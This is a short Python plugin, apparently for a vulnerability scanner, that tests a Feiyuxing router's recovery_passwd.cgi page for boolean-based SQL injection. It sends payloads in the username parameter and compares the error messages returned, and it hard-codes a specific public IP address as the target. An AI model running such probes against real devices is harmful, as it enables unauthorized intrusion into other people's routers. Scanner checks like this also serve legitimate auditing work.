#!/usr/bin/env python
#-*- coding:utf-8 -*-

import urlparse
def assign(service, arg):
    if service == 'feiyuxing_router':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    poc1 = arg + 'recovery_passwd.cgi?act=2&username=vultest%27+or+%271%27=%271'
    poc2 = arg + 'recovery_passwd.cgi?act=2&username=vultest%27+or+%271%27=%272'
    code, head, res1, errcode, _ = curl.curl(poc1)
    code, head, res2, errcode, _ = curl.curl(poc2)
    if '发送错误!' in res1 and '您输入的管理员用户不存在!' in res2:
        security_hole("Router vulnerable!:"+poc1)

if __name__ == '__main__':
    from dummy import *
    audit(assign('feiyuxing_router', 'https://221.13.108.150/')[1])